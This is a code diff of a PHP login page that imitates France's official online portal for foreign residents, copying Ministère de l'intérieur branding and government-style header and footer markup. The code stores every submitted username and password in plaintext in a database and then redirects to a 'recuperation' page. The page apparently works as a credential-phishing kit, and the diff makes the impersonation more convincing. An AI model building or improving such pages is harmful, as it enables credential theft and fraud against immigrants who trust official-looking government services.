@@ -1,56 +1,243 @@
 <?php
-session_start();
-
-// Connexion à la base
+// Connexion à la base de données
 $host = 'localhost';
-$db   = 'login_db';
-$user = 'root';
-$pass = '';
+$db   = 'login_db'; // Mets ici le nom de ta base
+$user = 'root';          // Par défaut sous XAMPP
+$pass = '';              // Par défaut sous XAMPP
 $charset = 'utf8mb4';
 
 $dsn = "mysql:host=$host;dbname=$db;charset=$charset";
 $options = [
     PDO::ATTR_ERRMODE            => PDO::ERRMODE_EXCEPTION,
     PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
+    PDO::ATTR_EMULATE_PREPARES   => false,
 ];
 
 try {
     $pdo = new PDO($dsn, $user, $pass, $options);
 } catch (\PDOException $e) {
-    die('Erreur de connexion à la base de données : ' . $e->getMessage());
+    exit('Erreur de connexion à la base de données : ' . $e->getMessage());
 }
 
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     // On récupère les infos du formulaire
-    $_SESSION['username'] = $_POST['username'] ?? '';
-    $_SESSION['password'] = $_POST['password'] ?? '';
+    $username = $_POST['username'] ?? '';
+    $password = $_POST['password'] ?? '';
 
-    // Insertion dans la base
-    $stmt = $pdo->prepare('INSERT INTO users (username, password) VALUES (?, ?)');
-    $stmt->execute([$_SESSION['username'], $_SESSION['password']]);
+    // Vérifier si l'utilisateur existe déjà
+    $stmt = $pdo->prepare('SELECT COUNT(*) FROM users WHERE username = ?');
+    $stmt->execute([$username]);
+    $exists = $stmt->fetchColumn();
 
-    // Redirection vers la page de ton choix
-    header('Location: recuperation.php');
-    exit;
+    if ($exists) {
+        echo "<div style='color:red;text-align:center;'>Cet identifiant existe déjà.</div>";
+    } else {
+        // Insertion dans la base
+        $stmt = $pdo->prepare('INSERT INTO users (username, password) VALUES (?, ?)');
+        $stmt->execute([$username, $password]);
+
+        // Redirection vers la page de ton choix
+        header('Location: recuperation.php');
+        exit;
+    }
 }
 ?>
+
 <!DOCTYPE html>
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
     <title>Connexion à Administration numérique pour les étrangers en France</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <header>
-        <img class="logo" src="image-1773717388977.png" alt="Logo">
-    </header>
     <style>
         body {
             background: #f7f7fb;
             font-family: Arial, sans-serif;
             margin: 0;
         }
-        .logo{
+
+        .fr-footer {
+    box-shadow: inset 0 2px 0 0 #000091, inset 0 -1px 0 0 #eee;
+    padding-top: 2rem;
+    width: 100%;
+    background: #fff;
+    font-family: 'Marianne', Arial, sans-serif;
+    font-size: 1rem;
+    color: #222;
+    margin-top: 40px;
+}
+.fr-footer__body {
+    display: flex;
+    justify-content: space-between;
+    align-items: flex-start;
+    flex-wrap: wrap;
+    gap: 2rem;
+    border-bottom: 1px solid #eee;
+    padding-bottom: 1.5rem;
+    margin-left: 90px;
+}
+.fr-footer__brand .fr-logo {
+    font-weight: bold;
+    font-size: 1.2em;
+    margin: 0;
+}
+.fr-footer__content-list {
+    list-style: none;
+    padding: 0;
+    color: #000; /* noir */
+    display: flex;
+    gap: 1.5rem;
+    justify-content: center; /* centre horizontalement */
+    align-items: center;      /* centre verticalement */
+    text-align: center;       /* centre le texte */
+}
+.fr-footer__content-link {
+    color: #2a3cff;
+    text-decoration: underline;
+}
+.fr-footer__partners {
+    margin: 2rem 0;
+    margin-left: 96px;
+}
+.fr-footer__partners-title {
+    font-size: 1.1em;
+    font-weight: bold;
+    margin-bottom: 0.5rem;
+}
+.fr-footer__partners-logos {
+    display: flex;
+    align-items: center;
+    gap: 1rem;
+}
+.fr-footer__logo {
+    height: 5.625rem;
+}
+.fr-footer__bottom {
+    border-top: 1px solid #eee;
+    padding-top: 1rem;
+    margin-top: 1rem;
+    display: flex;
+    flex-wrap: wrap;
+    justify-content: space-between;
+    align-items: center;
+}
+.fr-footer__bottom-list {
+    list-style: none;
+    display: flex;
+    gap: 1.5rem;
+    margin: 0;
+    padding: 0;
+}
+.fr-footer__bottom-link {
+    color: #222;
+    text-decoration: underline;
+}
+.fr-footer__bottom-copy {
+    font-size: 0.95em;
+    color: #666;
+}
+@media (max-width: 900px) {
+    .fr-footer__body, .fr-footer__bottom {
+        flex-direction: column;
+        gap: 1rem;
+    }
+    .fr-footer__content-list, .fr-footer__bottom-list {
+        flex-direction: column;
+        gap: 0.5rem;
+    }
+}
+        /* Header DSFR styles */
+        .fr-header {
+            position: relative;
+            width: 100%;
+            background: #fff;
+            border-bottom: 1px solid #eee;
+            font-family: 'Marianne', Arial, sans-serif;
+            font-size: 1rem;
+            color: #222;
         }
+        .fr-header__body {
+            padding: 0 2rem;
+        }
+        .fr-header__body-row {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            min-height: 90px;
+        }
+        .fr-header__brand {
+            display: flex;
+            align-items: center;
+        }
+        .fr-header__logo img {
+            height: 60px;
+            margin-right: 24px;
+        }
+        .fr-header__service-title {
+            font-size: 1.5em;
+            font-weight: bold;
+            margin: 0;
+        }
+        .fr-header__service-tagline {
+            font-size: 1em;
+            color: #131212;
+            margin: 0;
+        }
+        .fr-header__tools {
+            display: flex;
+            align-items: center;
+            gap: 1.5rem;
+        }
+        .fr-btns-group {
+            list-style: none;
+            display: flex;
+            gap: 1rem;
+            margin: 0;
+            padding: 0;
+        }
+        .fr-btn {
+            background: none;
+            border: none;
+            color: #000091;
+            font-weight: 500;
+            font-size: 1em;
+            cursor: pointer;
+            text-decoration: none;
+            padding: 0.5em 1em;
+        }
+        .fr-btn:hover {
+            text-decoration: underline;
+        }
+        .fr-lang .fr-btn {
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            background: #f7f7fb;
+        }
+        .fr-nav {
+            margin-top: 1rem;
+        }
+        .fr-nav__list {
+            list-style: none;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            gap: 2rem;
+            height: 40px;
+        }
+        .hr{
+            color: #b4b4b4;
+        }
+        .fr-nav__link {
+            color: #222;
+            text-decoration: none;
+            font-weight: 500;
+            font-size: 1.1em;
+        }
+        .fr-nav__link:hover {
+            color: #2a3cff;
+            text-decoration: underline;
+        }
+        /* Login styles */
         .login-main {
             background: #f6f6f6;
             max-width: 600px;
@@ -223,6 +410,54 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     </style>
 </head>
 <body>
+
+    <!-- Header DSFR simplifié -->
+    <div class="fr-header">
+      <div class="fr-header__body">
+        <div class="fr-container">
+          <div class="fr-header__body-row">
+            <div class="fr-header__brand fr-enlarge-link">
+              <div class="fr-header__brand-top">
+                <div class="fr-header__logo">
+                  <img src="image-1773742141442.png" alt="Ministère de l'intérieur" style="height:90px;">
+                </div>
+              </div>
+              <div class="fr-header__service">
+                <p class="fr-header__service-title">
+                  Administration numérique pour les étrangers en France
+                </p>
+
+                <ul></ul>
+                <p class="fr-header__service-tagline">Direction Générale des étrangers en France</p>
+              </div>
+            </div>
+            <div class="fr-header__tools">
+              <ul class="fr-btns-group">
+                <li>
+                  <a class="fr-btn" href="#">&#128222; Nous contacter</a>
+                </li>
+                <li>
+                  <a class="fr-btn" href="#">&#10067; Besoin d'aide ?</a>
+                </li>
+              </ul>
+              <div class="fr-lang">
+                <button class="fr-btn">FR</button>
+              </div>
+            </div>
+          </div>
+          <hr> 
+          <nav class="fr-nav">
+            
+            <ul class="fr-nav__list">
+              <li class="fr-nav__item">
+                <a class="fr-nav__link" href="index.php">Accueil</a>
+              </li>
+            </ul>
+          </nav>
+        </div>
+      </div>
+    </div>
+
     <div class="login-main">
         <div class="login-title">
             Connexion à Administration numérique<br>
@@ -272,8 +507,52 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             pwd.type = pwd.type === "password" ? "text" : "password";
         }
     </script>
-    <footer>
-        <img src="image-1773717613885.png" alt="">
-    </footer>
+    <!-- Footer DSFR simplifié -->
+<footer class="fr-footer" role="contentinfo" id="footer-7475">
+  <div class="fr-container">
+    <div class="fr-footer__body">
+      <div class="fr-footer__brand fr-enlarge-link">
+      <img class="fr-logo" src="image-1773744180833.png" alt="">
+      </div>
+      <div class="fr-footer__content">
+        <ul class="fr-footer__content-list">
+          <li class="fr-footer__content-item">
+            <a target="_blank" rel="noopener external" title="service-public.fr - Nouvelle fenêtre" class="fr-footer__content-link" href="https://service-public.fr">service-public.fr</a>
+          </li>
+          <li class="fr-footer__content-item">
+            <a target="_blank" rel="noopener external" title="data.gouv.fr - Nouvelle fenêtre" class="fr-footer__content-link" href="https://data.gouv.fr/fr">data.gouv.fr</a>
+          </li>
+        </ul>
+      </div>
+    </div>
+    <div class="fr-footer__partners">
+      <h2 class="fr-footer__partners-title">Nos Partenaires</h2>
+      <div class="fr-footer__partners-logos">
+        <div class="fr-footer__partners-main">
+          <a class="fr-footer__partners-link" href="https://www.immigration.interieur.gouv.fr/fr/Info-ressources/Fonds-europeens/Les-fonds-europeens-programmation-2014-2020/Le-Fonds-Asile-Migration-Integration-FAMI-et-le-Fonds-Securite-Interieure-FSI">
+            <img class="fr-footer__logo" style="height: 5.625rem" src="logo-fami.png" alt="Financé par le Fonds Asile, Migration et Intégration. Union Européenne">
+          </a>
+        </div>
+      </div>
+    </div>
+    <div class="fr-footer__bottom">
+      <ul class="fr-footer__bottom-list">
+        <li class="fr-footer__bottom-item">
+          <a class="fr-footer__bottom-link" href="#">Plan du site</a>
+        </li>
+        <li class="fr-footer__bottom-item">
+          <a class="fr-footer__bottom-link" href="#">Accessiblité : non conforme</a>
+        </li>
+        <li class="fr-footer__bottom-item">
+          <a class="fr-footer__bottom-link" href="#">Mentions légales</a>
+        </li>
+      </ul>
+      <div class="fr-footer__bottom-copy">
+        <p>Sauf mention explicite de propriété intellectuelle détenue par des tiers, les contenus de ce site sont proposés sous <a href="https://github.com/etalab/licence-ouverte/blob/master/LO.md" target="_blank" rel="noopener external" title="Licence etalab - nouvelle fenêtre">licence etalab-2.0</a>
+        </p>
+      </div>
+    </div>
+  </div>
+</footer>
 </body>
 </html>
